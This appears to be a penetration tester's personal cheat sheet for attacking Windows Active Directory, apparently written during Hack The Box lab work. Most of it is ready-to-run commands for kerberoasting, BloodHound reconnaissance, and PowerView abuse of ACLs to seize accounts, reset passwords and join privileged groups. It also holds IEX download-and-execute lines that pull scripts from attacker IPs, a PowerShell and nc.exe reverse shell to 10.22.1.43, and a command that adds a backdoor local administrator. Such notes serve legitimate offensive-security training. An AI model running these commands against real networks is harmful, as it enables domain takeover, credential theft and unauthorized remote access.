
### ldapsearch
* syntax can be tricky 

**Get SPNs**

* look for dn= users 
> ldapsearch -x -h 10.10.10.100 -p 389 -D "SVC_TGS" -w "password1234" -b "dc=contoso,dc=com" -s sub serviceprincipalname | grep -B 1 servicePrincipalName | more
    
    dn: CN=Administrator,CN=Users,DC=contoso,DC=com                                                                                                                     
    servicePrincipalName: active/CIFS:445   

### Execute ps1 script as x64 if using x32 shell
* instance came up where OS was x64 but shell was an x32 bit 
* https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe

> %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe

OR

> C:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe

### GetUserSPNs.py 
* instead of ldapsearch this can be run to enumerate then request the TGS ticket with the hash for cracking with hashcat 

> /usr/share/doc/python-impacket/examples/GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100

**Sync time with kerberos server**
> rdate -n 10.10.10.100 -v

**verify your time**
> date

**request for TGS ticket containing hash from all users**
* we authenticate with our user creds to enumerate all TGS hashed tickets
* if we had an admin user identified as kerberoastable via bloodhound it should show up here and we can crack it

> /usr/share/doc/python-impacket/examples/GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request

### BloodHound
* git clone https://github.com/BloodHoundAD/BloodHound.git
* use built in queries for kerberoastable searches for admin accounts to target 
* use the "Shortest Paths to High Value Targets" query to find immediate paths and generate leads for admin escalations
* use the Pathfinding feature to input a user of interest and an object like a group of interest to see what rights are available for escalation


**Running SharpHound collector from My Windows Machine**
* using the NET ONLY method to authenticate as a user from my win box
* upload the SharpHound.exe to my win box and use following command with PS
* change the dns settings on your TAP vpn adapter to the domain controller in question
* need to specifiy domain etc because we aren't domain joined to the machine

>  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100

* PS1 script alternative
* Don't run from directly mounted smb drive, copy it directly on the machine C drive

> import-module SharpHound.ps1

> Invoke-Bloodhound -CollectionMethod All

* run remotely
> IEX(New-Object Net.webClient).downloadString('http://10.10.14.17/SharpHound.ps1')

* upload the exported zip to kali box and upload it to Blood hound(see kali linux env notes on setup)

**start db**
> neo4j start

**start bloodhound**

> cd /usr/lib/bloodhound/

> ./BloodHound

* login(creds in KeePass)
* use upload data button to upload your exported zip files
* use the search for node and type the name of the domain it shoul autofill and you can begin investigation 

**Write Owners with PowerView**
* if a user is write owner over another user they can effectively take ownership of the user object to even reset their password
* Under a user profile look at "first degree object control"
* look at transitive controls to reveal what a user could achieve after taking control of the first degree object noticed

* Import the PowerView.ps1 module
> import-module PowerView.ps1

> IEX(New-Object Net.webClient).downloadString('http://10.10.14.17/PowerView.ps1')

> powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.14.17/PowerView.ps1')"


* Taking ownership of an account
> Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico -verbose

* Setting password reset rights if owning the account
> Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose

* Resetting users password
> \\$pass = ConvertTo-SecureString 'p@ssword1234' -AsPlainText -Force 

> Set-DomainUserPassword Herman -AccountPassword $pass -verbose

**WriteDACL**
* will add a user to a group if the user has these perms to a group

* Adding to the "Backup_Admins" group as Herman with Creds captured in var

> \\$pass = ConvertTo-SecureString 'p@ssword1234' -AsPlainText -Force

> \\$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman',\\$pass)

>  Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential \\$cred 

**View users Group memberships**

> Get-DomainGroup -MemberIdentity Herman | select samaccountname

### Kerberoasting
* use bloodhound to identify kerberoastable admin account
* use GetUsersSPNs.py to get the Ticket Granting admin hash
* use hashcat to crack the kerb hash with rockyou.txt 
* use psexec.py to authenticate with cracked password as the kerberoastable admin user

### Authenticating with captured Creds
* kerberoasting,discovered in text file,ssh keys or otherwise

**Test creds with Runas**
* will prompt for password and output failure if it fails or make the file

> C:\Windows\System32\runas.exe /env /noprofile /user:walter "cmd /c echo test > c:\test.txt"

**Testing a Users creds with PS/.NET**
* just change the user/pass
* for .NET 2.0, if the command is successful without errors the creds work
powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = 'Billy'; $password = 'password1234'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, \$securePassword; Start-Process -FilePath C:\Windows\System32\calc.exe -NoNewWindow -Credential $credential; }"
* For NET 3.0
powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = 'Alice'; $password = 'aliceishere'; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); }"
**Powershell**
* use this method once getting a PS prompt
* make the password variable > creds var > execute remote PS shell using the creds and hope for admin creds

> \$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force 

> \\$cred = New-Object System.Management.Automation.PSCredential('Administrator',\$SecPass)

> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.22.1.43/Invoke-PowerShellTcp-1338.ps1')" -Credential $cred

* alternative reverse shell with nc.exe as supplied user

> \$username = 'Billy'

> \$password = 'password1234'

> \\$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

> \\$credential = New-Object System.Management.Automation.PSCredential \\$username, \$securePassword

> Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential \$credential -ArgumentList ("-e","cmd.exe","10.22.1.43","446") -WorkingDirectory C:\Users\Public


**psexec.py**
* use this with admin creds and a writeable smb share and you could get a shell
* fixed to work directly from command line
* --lusers will list logged on useres 
* --shares will list available shares
* --sam can list the SAM hashes if available 


> /usr/share/doc/python-impacket/examples/psexec.py contoso.com/administrator@10.10.10.100

* also works with just locally added admin creds

> psexec.py walter@10.22.1.43

**wmiexec.py**
* also uses smb as vector it seems but can supply password

> /usr/share/doc/python-impacket/examples/wmiexec.py contoso.com/administrator:passowrd1234@10.10.10.100


**crackmapexec spray creds**

(SEE PTH SECTION BELOW)

### Net Only (Authenticating with User Creds to  a Domain)
* Use the Net Only command with the domain/user params to authenticate and try to enumerate things against a given domain
* on HTB remember to first disconnect your  vpn on kali and recconnect via windows box. 
* install the openvpn EXE file if you need to and can just just my openvpn HTB connection file

**Opening a cmd prompt as a domain user**
> runas /netonly /user:contoso.com\SVC_TGS cmd

**Verify creds work by listing share we know only the user could read**

> dir \\\10.22.1.43\Users

> net view \\10.22.1.43\

### Add admin users
> cmd /c net user walter P@ssWORD1234 /add

> cmd /c net localgroup Administrators walter /add

> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
